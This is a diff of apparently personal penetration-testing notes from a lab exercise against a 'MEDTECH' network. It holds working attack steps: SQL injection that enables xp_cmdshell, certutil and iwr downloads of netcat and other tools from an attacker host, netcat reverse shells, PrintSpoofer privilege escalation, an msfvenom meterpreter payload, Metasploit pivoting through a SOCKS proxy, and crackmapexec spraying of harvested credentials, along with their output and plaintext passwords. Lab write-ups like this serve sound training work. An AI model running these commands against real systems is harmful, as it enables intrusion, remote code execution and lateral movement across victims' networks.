@@ -59,13 +59,17 @@ http://192.168.215.121/login.aspx
 
 # Lets try with the weak password admin:admin Failed :D
 # Lets try with BlindSQLi
-admin=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.177:8088/Windows/nc.exe C:/Windows/Temp/nc.exe";--
+UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
+UsernameTextBox=1';RECONFIGURE;--
+UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
+UsernameTextBox=1';RECONFIGURE;--
+admin=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.206:8088/Windows/nc.exe C:/Temp/nc.exe";--
 ...
 192.168.215.121 - - [28/May/2024 08:05:44] "GET /Windows/nc.exe HTTP/1.1" 200 -
 ...
 # Our https feedback with 200, means it is able to use SQLi!
 # Lets listen to 8443 and establish the connection with VM3
-admin=1';EXEC xp_cmdshell "C:/Windows/Temp/nc.exe 192.168.45.177 8443 -e cmd.exe";--
+admin=1';EXEC xp_cmdshell "C:/Temp/nc.exe 192.168.45.177 8443 -e cmd.exe";--
 # Go to the NC listener
 C:\Windows\system32>whoami
 nt service\mssql$sqlexpress
@@ -74,7 +78,7 @@ WEB02
 # Now we identify the VM3 machine is WEB02
 
 # Lets upload WinPEAS to check the machine
-certutil.exe -urlcache -f http://192.168.45.177:8088/Windows/winPEASx64.exe C:/TEMP/winPEAS.exe
+certutil.exe -urlcache -f http://192.168.45.206:8088/Windows/winPEASx64.exe C:/TEMP/winPEAS.exe
 ...
 web.config found a password: WhileChirpTuesday218
 ...
@@ -101,8 +105,8 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 # We can abuse it to get the NT AUTHORITY\SYSTEM level access
 # Lets utilize one of the PrintSpoofer tools
 
-PS C:\temp> iwr -uri http://192.168.45.177:8088/Windows/Priv-Esc/PrintSpoofer64.exe -Outfile Printspoof.exe
-PS C:\temp> .\Printspoof.exe -c "C:\TEMP\nc.exe 192.168.45.177 1234 -e powershell"
+PS C:\temp> iwr -uri http://192.168.45.206:8088/Windows/Priv-Esc/PrintSpoofer64.exe -Outfile Printspoof.exe
+PS C:\temp> .\Printspoof.exe -c "C:\TEMP\nc.exe 192.168.45.206 1234 -e powershell"
 
 # Go to listener
 PS C:\Windows\system32> whoami
@@ -131,10 +135,67 @@ PS C:\Users\Administrator\Desktop> type proof.txt
 a21cde38548900a820e8aeb8f25295f0
 
 # Now we owned the joe:Flowers1 credentials, we can try the crackmapexec to find out what joe can access
-sudo crackmapexec smb 192.168.215.120-122 172.16.215.10-14 172.16.215.82-83 -u joe -p Flowers1 --continue-on-success
 
-# Nothing we can touch.. Lets run the winPEAS again from C:\TEMP
+# Before that lets establish the connection with WEB02 and dynamic port forward from WEB02 and allow KALI route to MEDTECH internal network
 
-# Lets establish the connection with WEB02 and dynamic port forward all the route to internal network
+# Lets create a MSFpayload first
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.206 LPORT=8888 -f exe -o web02-cute.exe
 
-sudo crackmapexec smb 192.168.215.120-122 172.16.215.10-14 172.16.215.82-83 -u joe -p Flowers1 --continue-on-success
+
+# Chisel Tunneling
+https://github.com/twelvesec/port-forwarding?tab=readme-ov-file#SSH-Remote-Port-Forwarding
+msfconsole
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
+set LHOST tun0
+set LPORT 8888
+set ExitonSession False
+
+# WEB02
+PS C:\TEMP> iwr -uri http://192.168.45.206:8088/web02-cute.exe -Outfile cute.exe
+PS C:\TEMP> .\cute.exe
+
+# KALI
+# While it had established the sessions, lets create a route first
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > show options
+msf6 post(multi/manage/autoroute) > set session 1
+msf6 post(multi/manage/autoroute) > run
+[+] Route added to subnet 192.168.237.0/255.255.255.0 from host's routing table.
+[+] Route added to subnet 172.16.237.0/255.255.255.0 from host's routing table.
+
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 1081
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+
+msf6 auxiliary(server/socks_proxy) > run -j
+
+# Open new shell
+sudo nano /etc/proxychains4.conf
+...
+socks5 127.0.0.1 1081
+...
+
+# Lets try to access MEDTECH internal network
+proxychains nmap -sT -Pn 172.16.237.10-14
+proxychains nmap -sT -Pn 172.16.237.82-83
+code targets.txt
+
+# Crackmapexec 
+https://notes.benheater.com/books/active-directory/page/crackmapexec
+proxychains crackmapexec smb targets.txt -u joe -p 'Flowers1' -d medtech.com --continue-on-success
+...
+SMB         172.16.237.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.237.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.237.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.237.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.237.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.237.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.237.10   445    DC01             [+] medtech.com\joe:Flowers1 
+SMB         172.16.237.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
+SMB         172.16.237.12   445    DEV04            [+] medtech.com\joe:Flowers1 
+SMB         172.16.237.13   445    PROD01           [+] medtech.com\joe:Flowers1 
+SMB         172.16.237.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
+SMB         172.16.237.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
+...
